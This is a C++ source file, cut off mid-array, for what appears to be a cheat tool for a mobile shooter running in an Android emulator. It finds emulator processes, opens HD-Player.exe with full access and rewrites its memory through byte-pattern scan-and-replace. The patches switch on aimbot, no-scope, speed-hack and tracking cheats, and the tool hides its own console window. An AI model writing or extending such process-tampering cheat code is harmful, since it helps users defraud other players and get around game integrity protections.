

#include "main.h"
#include <tchar.h>
#include <dwmapi.h>

#pragma comment(lib, "d3d9.lib")

#include "aob/aob.hpp"
#include "Memory/Memory.h"
#include "Memory/Mem.hpp"
#include "letra.h"
#include "Discord RPC/Discord SDK/discord_rpc_init.h"

#include "anticrack.h"

#include "Discord RPC/Discord SDK/Includes/discord_register.h"
#include "Discord RPC/Discord SDK/Includes/discord_rpc.h"
std::string messger;
void OpenLink(const char* link) {
    ShellExecuteA(NULL, "open", link, NULL, NULL, SW_SHOWNORMAL);
}
static float text_animation = 0.00f;
static bool text_animation_hide = true;
float color_UI[4] = { 0.720f, 0.129f, 0.129f, 1.000f };
static float loader_animation = 0.f;




static int64_t eptime1 = std::chrono::duration_cast<std::chrono::seconds>(std::chrono::system_clock::now().time_since_epoch()).count();

Memory Alexander;
Memory mirza;
int ProcId = 0;

void AlexanderConsoleDetector()
{
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    Stealth = FindWindowA("Console Window Host", NULL);
    ShowWindow(Stealth, 0);
}

void Alexander_CONSOLE()
{
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth, 0);
}






bool bypassEmulator, antiblacklist1bs4, antiblacklist2bs4, discordrpc, streammode;
#include "Memory.h"




namespace var {
    bool bypassEmulator, antiblacklist1bs4, antiblacklist2bs4, discordrpc, streammode;
    int slider_integer = 250;
    float slider_float = 50.f;

    const char* items[]{ "Left", "Right", "Up", "Down" };
    int selectedItem = 0;

    bool multi_items_count1[5];
    const char* multi_items1[5] = { "One", "Two", "Three", "Four", "Five" };


    float color[4] = { 81 / 255.f,  138 / 255.f, 232 / 255.f, 1.f };
    float color1[4] = { 232 / 255.f,  81 / 255.f, 81 / 255.f, 1.f };

    int key, m;

    bool multibox = true;
    float color2[4] = { 255 / 255.f, 77 / 255.f, 77 / 255.f, 200 / 255.f };

    char username[65] = { "" };
    char password[65] = { "" };
    char keyer[65] = { "" };
}





















bool _bugcamara = false;
bool _aim18022 = false;
bool _camarax7 = false;

bool _camaramill = false;
bool _camarapremium = false;
bool _balasv2 = false;
bool _balasv3 = false;
bool _fixcamara = false;
bool _velosrafa = false;
bool _fixwall = false;
bool _trackingawm = false;
bool _rafaelmejor = false;
bool _noscope = false;
bool _switchawm = false;
bool _hooks = false;
bool _wallchafa = false;
bool _tiomods = false;
bool _speendx99 = false;
bool _triplefast22 = false;
bool _aimbotexterno = false;
bool _aimbotdrag = false;
bool _aimbotscope = false;
bool _tracking = false;
bool _aimbotbody = false;
bool _canbiotest = false;
bool _sniperawm = false;
bool _fixawm = false;
namespace bottons_dark {
    bool vc = false;
}

namespace bottons_darkon {
    bool vc = false;
    bool vc2 = false;
}

int GetPid(const char* procname)
{

    if (procname == NULL)
        return 0;
    DWORD pid = 0;
    DWORD threadCount = 0;

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe;

    pe.dwSize = sizeof(PROCESSENTRY32);
    Process32First(hSnap, &pe);
    while (Process32Next(hSnap, &pe)) {
        if (_tcsicmp(pe.szExeFile, procname) == 0) {
            if ((int)pe.cntThreads > threadCount) {
                threadCount = pe.cntThreads;

                pid = pe.th32ProcessID;

            }
        }
    }
    return pid;
}


const char* GetEmulatorRunning() {
    if (GetPid("HD-Player.exe") != 0)
        return "HD-Player.exe";

    else if (GetPid("HD-Player") != 0)
        return "HD-Player";

    else if (GetPid("MEmuHeadless.exe") != 0)
        return "MEmuHeadless.exe";

    else if (GetPid("LdVBoxHeadless.exe") != 0)
        return "LdVBoxHeadless.exe";

    else if (GetPid("AndroidProcess.exe") != 0)
        return "AndroidProcess.exe";

    else if (GetPid("Nox.exe") != 0)
        return "Nox.exe";

}



namespace bottons_dark {
    bool tpplay = false;
}

namespace bottons_darkon {
    bool tpplay = false;
    bool tpplay2 = false;
}

bool _chamsk = false;

namespace bottons_dark {
    bool fmpl = false;
}

namespace bottons_darkon {
    bool fmpl = false;
    bool fmpl2 = false;
}



namespace bottons_dark {
    bool tp = false;
}

namespace bottons_darkon {
    bool tp = false;
    bool tp2 = false;
}


namespace bottons_dark {
    bool w = false;
}

namespace bottons_darkon {
    bool w = false;
    bool w2 = false;
}


namespace bottons_dark {
    bool fm = false;
}

namespace bottons_darkon {
    bool fm = false;
    bool fm2 = false;
}


namespace bottons_dark {
    bool cf = false;
}

namespace bottons_darkon {
    bool cf = false;
    bool cf2 = false;
}


namespace bottons_dark {
    bool sp = false;
}

namespace bottons_darkon {
    bool sp = false;
    bool sp2 = false;
}


namespace bottons_dark {
    bool fk = false;
}

namespace bottons_darkon {
    bool fk = false;
    bool fk2 = false;
}




namespace bottons_dark {
    bool nm = false;
}

namespace bottons_darkon {
    bool nm = false;
    bool nm2 = false;
}

namespace bottons_dark {
    bool st = false;
}

namespace bottons_darkon {
    bool st = false;
    bool st2 = false;
}

namespace bottons_dark {
    bool as = false;
}

namespace bottons_darkon {
    bool as = false;
    bool as2 = false;
}

bool _seguridadxd = false;


namespace bottons_dark {
    bool cm = false;
}

namespace bottons_darkon {
    bool cm = false;
    bool cm2 = false;
}

bool _bypassfullpc = false;

namespace bottons_dark {
    bool gh = false;
}

namespace bottons_darkon {
    bool gh = false;
    bool gh2 = false;
}


bool prevKey1g = false;
bool prevKey2g = false;
bool prevKey3g = false;
bool prevKeyF1g = false;
bool prevKeyF2g = false;
bool prevKeyF3g = false;
bool prevKeyF4g = false;
bool prevKeyQg = false;
bool prevKeyEg = false;


bool IsKeyPressed(int vKey)
{
    return GetAsyncKeyState(vKey) & 0x8000;
}

static int selectghost = 0;

static int walltraspase = 0;

static int fantasmast = 0;
static int selectteleport = 0;

static int nosek = 0;

static int speendtimer = 0;


static int velosrapido = 0;

static int applyaimbot;
static int applydrag;
static int applybody;

static int wallchafa = 0;
static int camararafa = 0;

static int teleportplay = 0;

static int fantasmaplay = 0;


static int camaraunder = 0;
static int teleporrafaxd = 0;
static int saltoaltisimoxd = 0;


bool _macrosv8 = false;


















void  fixspeend() {
    messger = "APLICANDO.....";

    inject.fixspeend();

    Beep(400, 500);
    messger = "BYPASS SPEED x99 ACTIVADO";

};










void  fixawm() {
    messger = "Aplicando";

    inject.fixawm();

    Beep(400, 500);
    messger = "Aplicado con Exito";

};








void  canbiotest() {
    messger = "Aplicando";

    inject.canbiotest();

    Beep(400, 500);
    messger = "Aplicado con Exito";

};




void  NPC() {
    messger = "APLICANDO...";


    inject.NPC();

    Beep(400, 500);
    messger = "NPC NAME APLICADA.";

};

//void  camaramderecha() {
//    ImGui::InsertNotification({ NULL, 3000, "Aplicando  CAMARA x2" });
//
//    inject.camaramderecha();
//
//    Beep(400, 500);
//    ImGui::InsertNotification({ NULL, 3000, " CAMARA x2 Aplicado" });
//
//};

DWORD ProcessId = 0;
HANDLE ProcessHandle;

BOOL AttackProcess(const char* procname)
{
    DWORD ProcId = GetPid(procname);
    if (ProcId == 0)
        return false;

    ProcessId = ProcId;
    ProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, ProcessId);
    return ProcessHandle != nullptr;
}

void  camaramill() {
    messger = "APLICANDO....";

    SYSTEM_INFO si;
    GetSystemInfo(&si);

    DWORD_PTR SAddress = (DWORD_PTR)si.lpMinimumApplicationAddress;
    DWORD_PTR EAddress = (DWORD_PTR)si.lpMaximumApplicationAddress;

    messger = "Injecting Magic V1..";

    if (Alexander.AttackProcess("HD-Player.exe")) {

        std::vector<BYTE> scanpattern26 = { 0xA4, 0x70, 0x7D, 0x3F, 0x3A, 0xCD, 0x13, 0x3F, 0x0A, 0xD7, 0x23, 0x3C, 0xBD, 0x37, 0x86, 0x35 };
        std::vector<BYTE> replacepattern26 = { 0xA4, 0x70, 0x7D, 0x3F, 0x3A, 0xCD, 0x13, 0x3F, 0x0A, 0xD7, 0x23, 0x3C, 0x00, 0x00, 0x80, 0xBF };





        bool st = Alexander.ReplacePattern(SAddress, EAddress, scanpattern26.data(), replacepattern26.data());
        if (st)
        {
            messger = "Magic V1 : Injected!";
            Beep(800, 400);

        }
        else
        {
            messger = "Magic V1 : Error on inject!";

        };

    }

};


void  noscope() {
    if (mirza.AttackProcess("HD-Player.exe")) {

        SYSTEM_INFO si;
        GetSystemInfo(&si);
        DWORD_PTR startAddress = (DWORD_PTR)si.lpMinimumApplicationAddress;
        DWORD_PTR endAddress = (DWORD_PTR)si.lpMaximumApplicationAddress;

        messger = "Activating...";

        std::vector<BYTE> scanpattern2 = { 0x1A, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xCB, 0x00, 0x00, 0x00, '?', '?', '?', '?', 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, '?', '?', '?', '?', '?', '?', '?', '?', 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x04, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x68, 0x00, 0x00, 0x00, 0x94, 0x01, 0x00, 0x00, '?', '?', '?', '?', 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, '?', '?', '?', '?', '?', '?', '?', '?', '?', 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
        std::vector<BYTE> replacepattern2 = { 0x1A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };




        bool st = mirza.ReplacePattern(startAddress, endAddress, scanpattern2.data(), replacepattern2.data());
        if (st)
        {
            messger = "No Scope Awm Activated";

            Beep(500, 500);
        }
        else
        {
            messger = "No Scope Awm Not Activated";

        }
    };

};


void  switchawm() {
    

    if (mirza.AttackProcess("HD-Player.exe")) {

        SYSTEM_INFO si;
        GetSystemInfo(&si);
        DWORD_PTR startAddress = (DWORD_PTR)si.lpMinimumApplicationAddress;
        DWORD_PTR endAddress = (DWORD_PTR)si.lpMaximumApplicationAddress;

        messger = "Activating...";
        
        std::vector<BYTE> scanpattern9 = { 0x00, 0x00, 0xB4, 0x42, 0x96, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3F, 0x00, 0x00, 0x80, 0x3E, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x3F };
        std::vector<BYTE> replacepattern9 = { 0x00, 0x00, 0xB4, 0x42, 0x96, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xEC, 0x51, 0xB8, 0x3D, 0x8F, 0xC2, 0xF5, 0x3C, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x3F };




        bool st = mirza.ReplacePattern(startAddress, endAddress, scanpattern9.data(), replacepattern9.data());
        if (st)
        {
            messger = "Fast Switch Awm V2 Activated";
            Beep(500, 500);
        }
        else
        {
            messger = "Fast Switch Awm V2 Not Activated";

        }

    }
};




void  sniperawm() {
    messger = "Aplicando";

    inject.sniperawm();

    Beep(400, 500);
    messger = "Aplicado con Exito";

};


void  aimbotscope() {

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    DWORD_PTR startAddress = (DWORD_PTR)si.lpMinimumApplicationAddress;
    DWORD_PTR endAddress = (DWORD_PTR)si.lpMaximumApplicationAddress;

    messger = "Activating...";
    if (mirza.AttackProcess("HD-Player.exe")) {

        std::vector<BYTE> scan1 = { 0x33, 0x33, 0x13, 0x40, 0x00, 0x00, 0xF0, 0x3F };
        std::vector<BYTE> rep1 = { 0xF6, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0xF0, 0x3F };


        bool st = mirza.ReplacePattern(startAddress, endAddress, scan1.data(), rep1.data());
        if (st)
        {
            messger = "Aimbot Scope Activated";

            Beep(500, 500);
        }
        else
        {
            messger = "Aimbot Scope Not Activated";

        }
    }
    

};


void  tracking() {

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    DWORD_PTR startAddress = (DWORD_PTR)si.lpMinimumApplicationAddress;
    DWORD_PTR endAddress = (DWORD_PTR)si.lpMaximumApplicationAddress;

    messger = "Activating...";
    if (mirza.AttackProcess("HD-Player.exe")) {

        std::vector<BYTE> scan1 = { 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x3F, 0x00, 0x00, 0x80, 0x3F, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x3F, 0x00, 0x00, 0x80, 0x3F, 0x00, 0x00, 0x80, 0x3F, 0x00, 0x00, 0x80, 0x3F, 0x00, 0x00, 0x80, 0x3F, 0x00, 0x00, 0x80, 0x3F, 0x00, 0x00, 0x80, 0x3F };
        std::vector<BYTE> rep1 = { 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x3F, 0xB8, 0x1E, 0xE5, 0x3F, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x3F, 0x00, 0x00, 0x80, 0x3F, 0x00, 0x00, 0x80, 0x3F, 0x00, 0x00, 0x80, 0x3F, 0x00, 0x00, 0x80, 0x3F, 0x00, 0x00, 0x80, 0x3F, 0x00, 0x00, 0x80, 0x3F };




        bool st = mirza.ReplacePattern(startAddress, endAddress, scan1.data(), rep1.data());
        if (st)
        {
            messger = "Spees Hack Activated";

            Beep(500, 500);
        }
        else
        {
            messger = "Spees Hack Not Activated";

        }
    }


};


























void  trackingawm() {
    
    if (mirza.AttackProcess("HD-Player.exe")) {

        SYSTEM_INFO si;
        GetSystemInfo(&si);
        DWORD_PTR startAddress = (DWORD_PTR)si.lpMinimumApplicationAddress;
        DWORD_PTR endAddress = (DWORD_PTR)si.lpMaximumApplicationAddress;

        messger = "Activating...";

        std::vector<BYTE> scanpattern2 = { 0x40, 0xcd, 0xcc, 0x8c, 0x3f, 0x8f, 0xc2, 0xf5, 0x3c, 0xcd, 0xcc, 0xcc, 0x3d, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf0, 0x41, 0x00, 0x00, 0x48, 0x42, 0x00, 0x00, 0x00, 0x3f, 0x33, 0x33, 0x13, 0x40, 0x00, 0x00, 0xb0, 0x3f, 0x00, 0x00, 0x80, 0x3f, 0x01, 0x00, 0x00 };
        std::vector<BYTE> replacepattern2 = { 0x40, 0xe0, 0xb1, 0xff, 0xff, 0xe0, 0xb1, 0xff, 0xff, 0xe0, 0xb1, 0xff, 0xff, 0xe0, 0xb1, 0xff, 0xff, 0xe0, 0xb1, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf0, 0x41, 0x00, 0x00, 0x48, 0x42, 0x00, 0x00, 0x00, 0x3f, 0x33, 0x33, 0x13, 0x40, 0x00, 0x00, 0xb0, 0x3f, 0x00, 0x00, 0x29, 0x5c, 0x01, 0x00, 0x00 };




        bool st = mirza.ReplacePattern(startAddress, endAddress, scanpattern2.data(), replacepattern2.data());
        if (st)
        {
            messger = "Scope Tracking Awm Activated";

            Beep(500, 500);
        }
        else
        {
            messger = "Scope Tracking Awm Not Activated";

        }

    };

};




void  triplefast22() {

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    DWORD_PTR startAddress = (DWORD_PTR)si.lpMinimumApplicationAddress;
    DWORD_PTR endAddress = (DWORD_PTR)si.lpMaximumApplicationAddress;

    messger = "Activating...";

    if (mirza.AttackProcess("HD-Player.exe")) {

        std::vector<BYTE> scan1 = { 0x40, 0xcd, 0xcc, 0x8c, 0x3f, 0x8f, 0xc2, 0xf5, 0x3c, 0xcd, 0xcc, 0xcc, 0x3d, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf0, 0x41, 0x00, 0x00, 0x48, 0x42, 0x00, 0x00, 0x00, 0x3f, 0x33, 0x33, 0x13, 0x40, 0x00, 0x00, 0xb0, 0x3f, 0x00, 0x00, 0x80, 0x3f, 0x01, 0x00, 0x00 };
        std::vector<BYTE> rep1 = { 0x40, 0xe0, 0xb1, 0xff, 0xff, 0xe0, 0xb1, 0xff, 0xff, 0xe0, 0xb1, 0xff, 0xff, 0xe0, 0xb1, 0xff, 0xff, 0xe0, 0xb1, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xf0, 0x41, 0x00, 0x00, 0x48, 0x42, 0x00, 0x00, 0x00, 0x3f, 0x33, 0x33, 0x13, 0x40, 0x00, 0x00, 0xb0, 0x3f, 0x00, 0x00, 0x80, 0x3f, 0x01, 0x00, 0x00 };




        bool st = mirza.ReplacePattern(startAddress, endAddress, scan1.data(), rep1.data());
        if (st)
        {
            messger = "Sniper Scope Activated";

            Beep(500, 500);
        }
        else
        {
            messger = "Sniper Scope Not Activated";

        }

    };

};

//
//
//
//
//void  seguridadlogo3() {
//    ImGui::InsertNotification({ NULL, 3000, "Aplicando SEGURIDAD 3" });
//
//    inject.seguridadlogo3();
//
//    Beep(400, 500);
//    ImGui::InsertNotification({ NULL, 3000, "SEGURIDAD 3 Aplicado" });
//
//};





void  bugcamara() {
    messger = "Activando BUG SHOTING CAMARA!";

    inject.bugcamara();

    Beep(400, 500);
    messger = "BUG SHOTING CAMARA ACTIVADO!";

};






void  recargaplay() {
    messger = "APLICANDO..";

    inject.recargaplay();

    Beep(400, 500);
    messger = "RECARGA RAPIDA PLAY.";

};








void  tiroawm() {
    messger = "aplicando...";

    inject.tiroawm();

    Beep(400, 500);
    messger = "TIRO AWM APLICADA.";

};









void  invitado() {
    messger = "aplicando...";

    inject.invitado();

    Beep(400, 500);
    messger = "CUENTA ELIMINADA..";

};



void  velosrafa() {

    messger = "Aplicando";
    inject.velosrafa();

    Beep(400, 500);

    messger = "Aplicado";
};




void  balasv1() {
    messger = "APLICANDO...";

    inject.balasv1();

    Beep(400, 500);
    messger = "BALAS v1 NUEVAS ACTIVADO.";

};




void  miraamarilla() {
    messger = "aplicando...";

    inject.miraamarilla();

    Beep(400, 500);
    messger = "MIRA AMARILLA APLICADA.";

};


void  mirarosa() {
    messger = "aplicando...";

    inject.mirarosa();

    Beep(400, 500);
    messger = "MIRA ROSA APLICADA.";

};


void  miraroja() {
    messger = "aplicando...";

    inject.miraroja();

    Beep(400, 500);
    messger = "MIRA ROJA APLICADA.";

};






void  aimbotexterno() {

    messger = "Activating...";

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    DWORD_PTR startAddress = (DWORD_PTR)si.lpMinimumApplicationAddress;
    DWORD_PTR endAddress = (DWORD_PTR)si.lpMaximumApplicationAddress;

    if (mirza.AttackProcess("HD-Player.exe")) {
        std::vector<DWORD_PTR> aimbot_new;
        std::vector<BYTE> SearchAimbot = { 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA5, 0x43, 0x00, 0x00, 0x00, 0x00, '?', '?', '?', '?', 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, '?', '?', '?', '?', 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xBF };

        mirza.FindPattern(startAddress, endAddress, SearchAimbot.data(), aimbot_new);
        if (aimbot_new.empty()) {




        }


        for (auto result : aimbot_new)
        {
            int read;
            ReadProcessMemory(mirza.ProcessHandle, (LPVOID)(result + 96L), &read, sizeof(read), NULL);

            int write;
            WriteProcessMemory(mirza.ProcessHandle, (LPVOID)(result + 92L), &read, sizeof(read), NULL);

        }
        aimbot_new.clear();



        Beep(500, 500);
        messger = "Aimbot Head Activated";
    }

    else {
        messger = "Aimbot Head Not Activated";
    }

};


void  aimbotbody() {

    SYSTEM_INFO si;
    GetSystemInfo(&si);

    DWORD_PTR SAddress = (DWORD_PTR)si.lpMinimumApplicationAddress;
    DWORD_PTR EAddress = (DWORD_PTR)si.lpMaximumApplicationAddress;

    messger = "Activating...";

    if (mirza.AttackProcess("HD-Player.exe")) {

        std::vector<BYTE> scanpattern = { 0xDC, 0x52, 0x39, 0xBD, 0x27, 0xC1, 0x8B, 0x3C, 0xC0, 0xD0, 0xF8, 0xB9 };
        std::vector<BYTE> replacepattern = { 0x00, 0x00, 0x00, 0x3E, 0x0A, 0xD7, 0x23, 0x3D, 0xD2, 0xA5, 0xF9, 0xBC };

        std::vector<BYTE> scanpattern1 = { 0x63, 0x71, 0xB0, 0xBD, 0x90, 0x98, 0x74, 0xBB, 0x00, 0x00, 0x80, 0xB3 };
        std::vector<BYTE> replacepattern1 = { 0xCD, 0xDC, 0x79, 0x44, 0x90, 0x98, 0x74, 0xBB, 0x00, 0x00, 0x80, 0xB3 };

        std::vector<BYTE> scanpattern2 = { 0x7B, 0xF9, 0x6C, 0xBD, 0x58, 0x34, 0x09, 0xBB, 0xB0, 0x60, 0xBE, 0xBA };
        std::vector<BYTE> replacepattern2 = { 0xCD, 0xDC, 0x79, 0x44, 0x58, 0x34, 0x09, 0xBB, 0xB0, 0x60, 0xBE, 0xBA };

        std::vector<BYTE> scanpattern3 = { 0x54, 0x1B, 0x87, 0xBD, 0x90, 0xC6, 0xD7, 0xBA, 0x80, 0x54, 0x99, 0xB9 };
        std::vector<BYTE> replacepattern3 = { 0xCD, 0xDC, 0x79, 0x44, 0x90, 0xC6, 0xD7, 0xBA, 0x80, 0x54, 0x99, 0xB9 };

        std::vector<BYTE> scanpattern4 = { 0x71, 0x02, 0x87, 0xBD, 0x90, 0xFD, 0xD7, 0xBA, 0x40, 0x18, 0x98, 0x39 };
        std::vector<BYTE> replacepattern4 = { 0xCD, 0xDC, 0x79, 0x44, 0x90, 0xFD, 0xD7, 0xBA, 0x40, 0x18, 0x98, 0x39 };

        std::vector<BYTE> scanpattern5 = { 0xCC, 0xF8, 0x6C, 0xBD, 0x40, 0xD2, 0xCE, 0xB9, 0x58, 0x64, 0xBE, 0x3A };
        std::vector<BYTE> replacepattern5 = { 0xCD, 0xDC, 0x79, 0x44, 0x40, 0xD2, 0xCE, 0xB9, 0x58, 0x64, 0xBE, 0x3A };


        std::vector<BYTE> scanpattern6 = { 0x76, 0xFC, 0xDB, 0xBC, 0x7C, 0x5E, 0x8B, 0x3A, 0x50, 0x8B, 0xBB, 0x3A };
        std::vector<BYTE> replacepattern6 = { 0xCD, 0xDC, 0x79, 0x44, 0x7C, 0x5E, 0x8B, 0x3A, 0x50, 0x8B, 0xBB, 0x3A };

        std::vector<BYTE> scanpattern7 = { 0x80, 0x13, 0x95, 0xBC, 0x30, 0xFF, 0x37, 0xBB, 0x00, 0xFD, 0x78, 0x3B };
        std::vector<BYTE> replacepattern7 = { 0xCD, 0xDC, 0x79, 0x44, 0x30, 0xFF, 0x37, 0xBB, 0x00, 0xFD, 0x78, 0x3B };

        std::vector<BYTE> scanpattern8 = { 0x1F, 0x93, 0xDB, 0xBC, 0x90, 0xBF, 0x84, 0x3A, 0x20, 0xA6, 0xBB, 0xBA };
        std::vector<BYTE> replacepattern8 = { 0xCD, 0xDC, 0x79, 0x44, 0x90, 0xBF, 0x84, 0x3A, 0x20, 0xA6, 0xBB, 0xBA };

        std::vector<BYTE> scanpattern9 = { 0xEF, 0xA3, 0x00, 0xBE, 0x40, 0xB9, 0x92, 0x39, 0x20, 0x4E, 0x07, 0xBA };
        std::vector<BYTE> replacepattern9 = { 0xCD, 0xDC, 0x79, 0x44, 0x40, 0xB9, 0x92, 0x39, 0x20, 0x4E, 0x07, 0xBA };

        std::vector<BYTE> scanpattern10 = { 0xBC, 0x19, 0xFD, 0xBD, 0xB0, 0xE3, 0xA9, 0x3A, 0x80, 0x42, 0x23, 0xB9 };
        std::vector<BYTE> replacepattern10 = { 0xCD, 0xDC, 0x79, 0x44, 0xB0, 0xE3, 0xA9, 0x3A, 0x80, 0x42, 0x23, 0xB9 };

        mirza.ReplacePattern(SAddress, EAddress, scanpattern.data(), replacepattern.data());
        mirza.ReplacePattern(SAddress, EAddress, scanpattern1.data(), replacepattern1.data());

        mirza.ReplacePattern(SAddress, EAddress, scanpattern2.data(), replacepattern2.data());

        mirza.ReplacePattern(SAddress, EAddress, scanpattern3.data(), replacepattern3.data());
        mirza.ReplacePattern(SAddress, EAddress, scanpattern4.data(), replacepattern4.data());
        mirza.ReplacePattern(SAddress, EAddress, scanpattern5.data(), replacepattern5.data());
        mirza.ReplacePattern(SAddress, EAddress, scanpattern6.data(), replacepattern6.data());
        mirza.ReplacePattern(SAddress, EAddress, scanpattern7.data(), replacepattern7.data());
        mirza.ReplacePattern(SAddress, EAddress, scanpattern8.data(), replacepattern8.data());
        mirza.ReplacePattern(SAddress, EAddress, scanpattern9.data(), replacepattern9.data());

        bool st = mirza.ReplacePattern(SAddress, EAddress, scanpattern10.data(), replacepattern10.data());
        if (st)
        {
            messger = "Aimbot Body Activated";

            Beep(500, 500);
        }
        else
        {
            messger = "Aimbot Body Not Activated";

        }

    };

    


};


void  aimbotdrag() {

    messger = "Activating...";

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    DWORD_PTR startAddress = (DWORD_PTR)si.lpMinimumApplicationAddress;
    DWORD_PTR endAddress = (DWORD_PTR)si.lpMaximumApplicationAddress;

    if (mirza.AttackProcess("HD-Player.exe")) {
        std::vector<DWORD_PTR> aimbot_new;
        std::vector<BYTE> SearchAimbot = { 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA5, 0x43, 0x00, 0x00, 0x00, 0x00, '?', '?', '?', '?', 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', '?', 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, '?', '?', '?', '?', 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 